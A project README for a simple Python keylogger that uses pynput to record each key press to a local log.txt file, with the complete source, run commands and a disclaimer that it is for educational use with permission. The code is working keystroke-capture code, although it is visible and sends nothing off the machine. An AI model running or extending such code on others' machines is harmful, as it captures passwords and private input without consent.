# Simple Keylogger

## Description
This is a simple keylogger project developed in Python using the `pynput` library. The keylogger captures and logs key press events to a text file (`log.txt`).

## Prerequisites
- Python 3.x
- `pynput` library

## Installation

1. Clone the repository or download the source code.
2. Install the `pynput` library using pip:
    ```sh
    pip install pynput
    ```

## Usage

1. Run the `keylogger.py` script:
    ```sh
    python keylogger.py
    ```
2. The script will start logging key presses to the `log.txt` file in the same directory.

## Code Explanation

The keylogger script consists of the following parts:

1. **Imports**:
    ```python
    from pynput import keyboard
    ```

2. **Print statement to indicate the start of the keylogger**:
    ```python
    print("Simple Keylogger")
    ```

3. **Function to handle key press events**:
    ```python
    def on_press(key):
        print(f'Pressed: {key}')
        with open("log.txt", "a") as keylog:
            try:
                keylog.write(f'{key}\n')
            except:
                print("Error writing to keylog file.")
    ```

4. **Main block to start the keylogger**:
    ```python
    if __name__ == '__main__':
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        input()
    ```

### Key Press Event Handling
The `on_press` function is called whenever a key is pressed. It prints the key to the console and appends it to the `log.txt` file.

### Running the Keylogger
The keylogger starts by creating a `Listener` object from the `pynput.keyboard` module and setting its `on_press` parameter to the `on_press` function. The listener is then started, and the script waits for user input to keep running.

## Notes
- This project is for educational purposes only. Unauthorized use of a keylogger is illegal and unethical.
- Always obtain explicit permission before running a keylogger on any system that you do not own.

## Contributing
Feel free to fork the repository, submit issues, and send pull requests.

## License
This project is licensed under the MIT License. See the LICENSE file for more details.

## Contact
For any questions or suggestions, please contact [Sourabh Panchal](mailto:sourabh.panchal28@gmail.com).